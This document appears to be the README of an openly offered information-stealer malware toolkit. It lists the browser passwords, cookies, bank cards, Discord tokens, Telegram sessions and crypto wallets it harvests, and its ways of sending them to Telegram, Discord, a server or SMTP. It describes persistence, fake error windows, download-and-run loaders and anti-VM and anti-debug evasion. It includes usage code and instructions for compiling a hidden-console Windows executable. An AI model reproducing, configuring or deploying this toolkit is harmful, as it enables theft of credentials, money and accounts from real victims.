# Stealer

Stealer in just a few lines with sending to Telegram / Server / Discord / SMTP. No dependencies, only built-in libraries.

## Description
The `Stealer` already has an impressive functionality that will only expand.

## Navigation
* [Current features](#Сurrent-features)
* [Example usage](#Example-usage)
  * [Standard](#Standard)
  * [Certain modules](#Certain-modules)
  * [Additional parameters](#Additional-parameters)
* [Creating exe](#Creating-exe)
  * [Creating executable file](#Creating-executable-file)
  * [With BAT](#With-BAT)
  * [With CMD](#With-CMD)

### Current features
1. Support for the following browsers:
   - Chrome
   - Opera
   - Opera GX
   - Edge
   - Brave
   - Vivaldi
   - Yandex (Partially)
2. Collecting the following data:
   - Screenshot
   - Cookies
   - Passwords
   - Bank cards
   - History
   - Bookmarks
   - IP-address
   - System configuration
   - Active processes
   - Discord tokens
   - Telegram sessions
   - FileZilla hosts
   - Crypto wallets:
       - Metamask
       - Phantom
       - Atomic
       - Exodus
       - Other 10 wallets
   - Steam configs
3. Built-in sending methods: 
   - Telegram
   - Server
   - Discord
   - SMTP
4. Support for browser multiprofiles.
5. Execution in a separate thread.
6. Execution using multiprocessor.
7. Possibility to add to autostart.
8. Showing a window with a fake error.
9. Execution without creating any files.
10. Downloading and launching files by link.
11. Collecting files of the specified format in the specified directories.
12. Stopping work on virtual machines and when trying to debug.

## Example usage
### Standard
```python
from Stealer import Stealer, Senders

if __name__ == '__main__':
    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```
### Certain modules

An example with only system data collection and screenshot.
```python
from Stealer import Stealer, Features, Senders

if __name__ == '__main__':
    Stealer(
        senders=[
            Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)
        ], 
        features=[
            Features.system,
            Features.screenshot
        ]
    ).run()
```
### Additional parameters

- `features` - list of modules from `Stealer.Features`:

  - `passwords` - collecting passwords.

  - `cookies` - collecting cookies.

  - `cards` - collecting bank cards.

  - `history` - collecting search history.

  - `bookmarks` - collecting bookmarks.

  - `extensions` - collecting browser extensions.

  - `processes` - collecting active processes.

  - `system` - collecting system configuration.

  - `screen` - screenshot.

  - `discord` - collecting Discord tokens.

  - `telegram` - collecting Telegram sessions.

  - `filezilla` - collecting FileZilla hosts.

  - `wallets` - collecting crypto wallets.

  - `steam` - collecting Steam configs.


- `utils` - list of utilities from `Stealer.Utils`:

  - `autostart` - adding to autostart.

  - `message` - showing a fake [error window](https://github.com/FallenAstaroth/stink/wiki/Fake-error).


- `protectors` - list of protectors from `Stealer.Protectors`:

  - `processes` - checking processes for presence of debugging programs and virtual machines.

  - `mac_address` - checking MAC addresses for blacklisting.

  - `computer` - checking PC name for blacklisting.

  - `user` - checking username for blacklisting.

  - `hosting` - checking if PC is hosted.

  - `http_simulation` - checking for HTTP simulation.

  - `virtual_machine` - checking for virtual machine.

  - `disable` - complete disabling of all checks.

  - `all` - enabling of all checks.


- `senders` - list of sending methods from `stink.Senders`:

  - `server` - sending to [server].

  - `telegram` - sending to [Telegram].

  - `discord` - sending to [Discord].

  - `smtp` - send to [mail].


- `loaders` - list of file loaders from `Stealer`:

  - `Loader` - universal [loader].


- `grabbers` - list of file grabbers from `Stealer`:

  - `Grabber` - universal [grabber].
  
## Creating exe
Python is an interpreted programming language, so we first translate it into C and then compile it into an .exe file.
We will need Nuitka to do this.

### Creating executable file

1. [Download] archive.
2. Unpack the archive.
3. Create test.py (or any other name) file in the same directory with the following code:
```python
from Stealer import Stealer, Senders

if __name__ == '__main__':
    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```

#### With BAT
1. Run compiler.bat.


#### With CMD
1. Open `cmd`.
2. Type in the command:
```
pip install virtualenv
```
3. Go to the folder with the `test.py` file:
```
cd path\to\file
```
4. Create a virtual environment and activate it:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Install the Nuitka:
```
pip install Nuitka
```
6. To reduce the file size, additionally install Zstandard (optional):
```
pip install zstandard
```
7. Write the command:
```
nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
```

After executing the command we get the test.exe file with the hidden console.
